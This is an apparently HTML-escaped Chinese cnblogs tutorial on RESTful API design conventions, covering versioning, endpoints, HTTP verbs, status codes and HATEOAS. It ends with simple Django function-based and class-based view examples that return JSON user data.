-&lt;p&gt;那么先来简单了解一下&lt;/p&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;1、协议&lt;/h2&gt;
-&lt;p&gt;API与用户的通信协议，总是使用&lt;a href=&quot;http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&quot; target=&quot;_blank&quot;&gt;HTTPs协议&lt;/a&gt;。&lt;/p&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;2、域名&lt;/h2&gt;
-&lt;p&gt;有两种方式&lt;/p&gt;
-&lt;p&gt;方式一： 尽量将API部署在专用域名（会存在跨域问题）&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot;&gt;
-&lt;pre&gt;
-https://api.example.com
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;方式二：如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot;&gt;
-&lt;pre&gt;
-https://example.org/api/
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;3、版本（Versioning）&lt;/h2&gt;
-&lt;p&gt;应该将API的版本号放入URL。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
-&lt;pre&gt;
-https://api.example.com/v1/
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。&lt;a href=&quot;https://developer.github.com/v3/media/#request-specific-version&quot; target=&quot;_blank&quot;&gt;Github&lt;/a&gt;采用这种做法。&lt;/p&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;4、路径（Endpoint）&lt;/h2&gt;
-&lt;p&gt;路径又称&quot;终点&quot;（endpoint），表示API的具体网址。&lt;/p&gt;
-&lt;p&gt;在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的&quot;集合&quot;（collection），所以API中的名词也应该使用复数。&lt;/p&gt;
-&lt;p&gt;举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
-&lt;pre&gt;
-https://api.example.com/v1/zoos
-https://api.example.com/v1/animals
-https://api.example.com/v1/employees
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;5、HTTP动词&lt;/h2&gt;
-&lt;p&gt;对于资源的具体操作类型，由HTTP动词表示。&lt;/p&gt;
-&lt;p&gt;常用的HTTP动词有下面五个（括号里是对应的SQL命令）。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-GET（SELECT）：从服务器取出资源（一项或多项）。即获取数据
-POST（CREATE）：在服务器新建一个资源。 即添加数据
-PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。即更新数据
-PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。即更新数据
-DELETE（DELETE）：从服务器删除资源  。即删除数据
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;还有两个不常用的HTTP动词。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
-&lt;pre&gt;
-HEAD：获取资源的元数据。
-OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;下面是一些例子：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-GET /zoos：列出所有动物园
-POST /zoos：新建一个动物园
-GET /zoos/ID：获取某个指定动物园的信息
-PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）
-PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）
-DELETE /zoos/ID：删除某个动物园
-GET /zoos/ID/animals：列出某个指定动物园的所有动物
-DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;6、过滤信息（Filtering）&lt;/h2&gt;
-&lt;p&gt;如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。&lt;/p&gt;
-&lt;p&gt;下面是一些常见的参数。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-?limit=10：指定返回记录的数量
-?offset=10：指定返回记录的开始位置。
-?page=2&amp;amp;per_page=100：指定第几页，以及每页的记录数。
-?sortby=name&amp;amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。
-?animal_type_id=1：指定筛选条件
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。&lt;/p&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;7、状态码（status codes）&lt;/h2&gt;
-&lt;p&gt;服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。
-201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。
-202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）
-204 NO CONTENT - [DELETE]：用户删除数据成功。
-400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。
-401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。
-403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。
-404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。
-406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。
-410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。
-422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。
-500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;状态码的完全列表参见&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html&quot; target=&quot;_blank&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;8、错误处理（Error handling）&lt;/h2&gt;
-&lt;p&gt;如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
-&lt;pre&gt;
-{
-    error: &quot;Invalid API key&quot;
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;9、返回结果&lt;/h2&gt;
-&lt;p&gt;针对不同操作，服务器向用户返回的结果应该符合以下规范&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-GET /collection：返回资源对象的列表（数组）
-GET /collection/resource：返回单个资源对象
-POST /collection：返回新生成的资源对象
-PUT /collection/resource：返回完整的资源对象
-PATCH /collection/resource：返回完整的资源对象
-DELETE /collection/resource：返回一个空文档
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;10、Hypermedia API  超媒体API&lt;/h2&gt;
-&lt;p&gt;RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。&lt;/p&gt;
-&lt;p&gt;比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
-&lt;pre&gt;
-{&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;link&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
-  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rel&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:   &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;collection https://www.example.com/zoos&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;表示这个API与当前网址的关系（collection关系，并给出该collection的网址）&lt;/span&gt;
-  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.example.com/zoos&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;API路径&lt;/span&gt;
-  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;List of zoos&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;API的标题&lt;/span&gt;
-  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;:  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;application/vnd.yourformat+json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回类型&lt;/span&gt;
-}}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Hypermedia API的设计被称为&lt;a href=&quot;http://en.wikipedia.org/wiki/HATEOAS&quot; target=&quot;_blank&quot;&gt;HATEOAS&lt;/a&gt;。Github的API就是这种设计，访问&lt;a href=&quot;https://api.github.com/&quot; target=&quot;_blank&quot;&gt;api.github.com&lt;/a&gt;会得到一个所有可用API的网址列表。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;{
-  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;current_user_url&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.github.com/user&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
-  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;authorizations_url&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.github.com/authorizations&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
-  &lt;/span&gt;//&lt;span&gt; ...
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;从上面可以看到，如果想获取当前用户的信息，应该去访问&lt;a href=&quot;https://api.github.com/user&quot; target=&quot;_blank&quot;&gt;api.github.com/user&lt;/a&gt;，然后就得到了下面结果。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;{
-  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Requires authentication&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
-  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;documentation_url&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://developer.github.com/v3&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h2 class=&quot;title&quot;&gt;方式一：FBV模式：&lt;/h2&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('4b814e26-d1eb-4c33-8de8-7380a20e4cd2')&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_4b814e26-d1eb-4c33-8de8-7380a20e4cd2&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_4b814e26-d1eb-4c33-8de8-7380a20e4cd2&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('4b814e26-d1eb-4c33-8de8-7380a20e4cd2',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_4b814e26-d1eb-4c33-8de8-7380a20e4cd2&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; django.contrib &lt;span&gt;import&lt;/span&gt;&lt;span&gt; admin
-
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url, include
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; app01 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; app02 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
-
-urlpatterns &lt;/span&gt;=&lt;span&gt; [
-    url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;admin/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, admin.site.urls),
-    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; path('hosts/',views.HostView.as_view()),&lt;/span&gt;
-    url(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;app02/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;app02.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
-]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;全局url&lt;/span&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('8bf6597f-f15a-4515-b466-2810ba567e16')&quot; readability=&quot;36&quot;&gt;&lt;img id=&quot;code_img_closed_8bf6597f-f15a-4515-b466-2810ba567e16&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_8bf6597f-f15a-4515-b466-2810ba567e16&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('8bf6597f-f15a-4515-b466-2810ba567e16',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8bf6597f-f15a-4515-b466-2810ba567e16&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;67&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; app02 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url
-urlpatterns &lt;/span&gt;=&lt;span&gt; [
-    url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.users),
-    url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^user/(\d+)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.user),
-
-    url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.UsersView.as_view()),
-    url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^user/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.UserView.as_view()),
-]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;app02/url&lt;/span&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('8c95bc7a-b05c-452e-a6a2-0b8003644c2c')&quot; readability=&quot;37.5&quot;&gt;&lt;img id=&quot;code_img_closed_8c95bc7a-b05c-452e-a6a2-0b8003644c2c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_8c95bc7a-b05c-452e-a6a2-0b8003644c2c&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('8c95bc7a-b05c-452e-a6a2-0b8003644c2c',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8c95bc7a-b05c-452e-a6a2-0b8003644c2c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; django.shortcuts &lt;span&gt;import&lt;/span&gt;&lt;span&gt; render,HttpResponse
-
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; Create your views here.&lt;/span&gt;
-&lt;span&gt;import&lt;/span&gt;&lt;span&gt; json
-
-&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; users(request):
-    response &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:1000,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:None}  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;code用来表示状态，比如1000代表成功，1001代表&lt;/span&gt;
-    response[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; [
-        {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;haiyan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:22&lt;span&gt;},
-        {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;haidong&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:10&lt;span&gt;},
-        {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;haixiyu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:11&lt;span&gt;},
-    ]
-    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps(response))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回多条数据&lt;/span&gt;
-
-&lt;span&gt;def&lt;/span&gt;&lt;span&gt; user(request,pk):
-    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; request.method ==&lt;span&gt;'&lt;/span&gt;&lt;span&gt;GET&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps({&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;haiyan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:11}))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回一条数据&lt;/span&gt;
-    &lt;span&gt;elif&lt;/span&gt; request.method ==&lt;span&gt;'&lt;/span&gt;&lt;span&gt;POST&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps({&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:1111}))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回一条数据&lt;/span&gt;
-    &lt;span&gt;elif&lt;/span&gt; request.method ==&lt;span&gt;'&lt;/span&gt;&lt;span&gt;PUT&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
-        &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
-    &lt;span&gt;elif&lt;/span&gt; request.method ==&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DELETE&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
-        &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;views&lt;/span&gt;&lt;/div&gt;
-&lt;h2 class=&quot;secondtitle&quot;&gt;方式二：CBV模式&lt;/h2&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('7e0f2e3c-87fe-4406-bf57-f44f1d805cf5')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_7e0f2e3c-87fe-4406-bf57-f44f1d805cf5&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_7e0f2e3c-87fe-4406-bf57-f44f1d805cf5&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('7e0f2e3c-87fe-4406-bf57-f44f1d805cf5',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_7e0f2e3c-87fe-4406-bf57-f44f1d805cf5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
-&lt;pre&gt;
- &lt;span&gt;from&lt;/span&gt; app02 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
- &lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url
- urlpatterns &lt;/span&gt;=&lt;span&gt; [
-     url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.UsersView.as_view()),
-     url(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^user/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.UserView.as_view()),
- ]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;app02/urls&lt;/span&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('f76cd705-e625-4686-8d8c-7abdb6f3eedc')&quot; readability=&quot;41.5&quot;&gt;&lt;img id=&quot;code_img_closed_f76cd705-e625-4686-8d8c-7abdb6f3eedc&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_f76cd705-e625-4686-8d8c-7abdb6f3eedc&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('f76cd705-e625-4686-8d8c-7abdb6f3eedc',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_f76cd705-e625-4686-8d8c-7abdb6f3eedc&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;78&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; django.views &lt;span&gt;import&lt;/span&gt;&lt;span&gt; View
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(View):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get(self,request):
-        response &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:1000,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:None}
-        response[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;data&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; [
-            {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;haiyan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: 22&lt;span&gt;},
-            {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;haidong&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: 10&lt;span&gt;},
-            {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;haixiyu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: 11&lt;span&gt;},
-        ]
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps(response),stutas=200&lt;span&gt;)
-
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserView(View):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get(self,request,pk):
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps({&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;haiyan&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:11}))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回一条数据&lt;/span&gt;
-    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; post(self,request,pk):
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(json.dumps({&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:1111}))  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回一条数据&lt;/span&gt;
-    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; put(self,request,pk):
-        &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
-    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; delete(self,request,pk):
-        &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;views&lt;/span&gt;&lt;/div&gt;
-&lt;p&gt;&lt;span&gt;基于django实现的API许多功能都需要我们自己开发，这时候djangorestframework就给我们提供了方便，直接基于它来返回数据，总之原理都是一样的，就是给一个接口也就是url，让前端的人去请求这个url去获取数据，在页面上显示出来。这样也就达到了前后端分离的效果。下面我们来看看基于Django Rest Framework框架实现&lt;/span&gt;&lt;/p&gt;
-
-&lt;h2&gt;1、自定义认证规则 &lt;/h2&gt;
-&lt;p&gt;详见&lt;a href=&quot;http://www.cnblogs.com/huchong/p/8448695.html&quot; target=&quot;_blank&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
